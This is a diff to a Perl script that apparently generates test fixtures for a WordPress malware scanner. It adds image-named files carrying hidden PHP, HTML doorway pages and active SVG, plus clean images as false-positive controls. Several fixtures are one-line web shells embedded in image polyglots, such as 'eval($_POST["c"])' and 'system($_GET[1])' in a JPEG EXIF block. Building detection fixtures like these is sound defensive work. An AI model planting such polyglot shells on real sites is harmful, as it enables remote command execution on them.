@@ -89,6 +89,26 @@ w('backups/wp-config-old.txt', "no credentials here\n");
 w('backups/old.php.bak', $P . "echo 1;\n");
 w('backups/empty.php.bak', '');
 
+# FAKE_IMAGE: image extension, not image data (or image + PHP appended)
+my $jpg = "\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00" . ("\x00" x 64) . "\xff\xd9";
+my $png = "\x89PNG\r\n\x1a\n\x00\x00\x00\x0dIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89"
+        . "\x00\x00\x00\x00IEND\xaeB`\x82";
+w('wp-content/uploads/2026/10/logo_s.jpg', $P . 'echo file_get_contents("https://api.example.com/page");' . "\n");
+w('wp-content/uploads/2026/10/banner_s.jpg', "<!DOCTYPE html>\n<html><head><title>doorway.example.com</title></head><body>x</body></html>\n");
+w('wp-content/uploads/2026/10/short-tag.png', '<?= "x" ?>' . "\n");
+w('wp-content/uploads/2026/10/polyglot.jpg', $jpg . '<?php eval($_POST["c"]); ?>');
+w('wp-content/uploads/2026/10/polyglot-gif.gif', "GIF89a\x01\x00\x01\x00\x00\x00\x00;" . "<?php echo 1; ?>\n");
+w('wp-content/uploads/2026/10/empty.png', '');
+# SVG renamed .png: quiet when plain (legit/img), flagged with active content
+my $svg = qq{<?xml version="1.0"?>\n<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 8 8">};
+w('wp-content/uploads/2026/10/svg-script.png', $svg . '<path d="M0 0h8v8z"/><script>location="https://svg.example.com/"</script></svg>' . "\n");
+w('wp-content/uploads/2026/10/svg-onload.png', '<svg onload="location=1" xmlns="http://www.w3.org/2000/svg"></svg>' . "\n");
+w('wp-content/uploads/2026/10/svg-link.png', $svg . '<a xlink:href="https://spam.example.com/"><text>x</text></a></svg>' . "\n");
+# PHP appended after a big image: only found by the tail read (head = 256 KB)
+w('wp-content/uploads/2026/10/appended-big.jpg', $jpg . ("\x00" x 400000) . '<?php echo 1; ?>');
+# PHP in EXIF/comment block right after the JPEG header
+w('wp-content/uploads/2026/10/exif-php.jpg', "\xff\xd8\xff\xfe\x00\x1c<?php system(\$_GET[1]); ?>" . ("\x00" x 400000) . "\xff\xd9");
+
 # ---------------- known false positives: must stay quiet/ignored ----------------
 w('legit/php/hex-lookup-table.php', $P .
   'static $ASCII = "' . hex_esc(' eiasntroludcmpgfbhvyqwkxjzEIASNTROLUD') . '";' . "\n");
@@ -116,3 +136,12 @@ w('legit/js/luhn.js', $H .
 w('wp-content/plugins/superb-helper-pro/assets/js/premium/premium-reveal-button.js', $H . $reveal . "\n");
 w('wp-content/uploads/placeholder/index.php', "<?php\n// Silence is golden.\n");
 w('backups/saved-page.php@id=1.htm', "<!doctype html><html><body>saved page</body></html>\n");
+w('legit/img/real.jpg', $jpg);
+w('legit/img/real.png', $png);
+w('legit/img/real.gif', "GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;");
+w('legit/img/favicon.ico', "\x00\x00\x01\x00\x01\x00\x01\x01\x00\x00\x01\x00\x20\x00" . ("\x00" x 48));
+w('legit/img/real.webp', "RIFF\x1a\x00\x00\x00WEBPVP8L\x0d\x00\x00\x00\x2f\x00\x00\x00\x10\x07\x10\x11\x11\x88\x88\xfe\x07\x00");
+w('legit/img/png-named-jpg.jpg', $png);
+w('legit/img/short-tag-bytes.jpg', $jpg . "\x10<?=\x7f" . $jpg);
+w('legit/img/svg-named-png.png', '<svg preserveAspectRatio="none" width="100%" height="100%" overflow="visible" style="display:block" viewBox="0 0 8 8" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h8v8z" fill="#123"/></svg>' . "\n");
+w('legit/img/svg-embedded-png.png', $svg . '<image xlink:href="data:image/png;base64,iVBORw0KGgo=" width="8" height="8"/></svg>' . "\n");
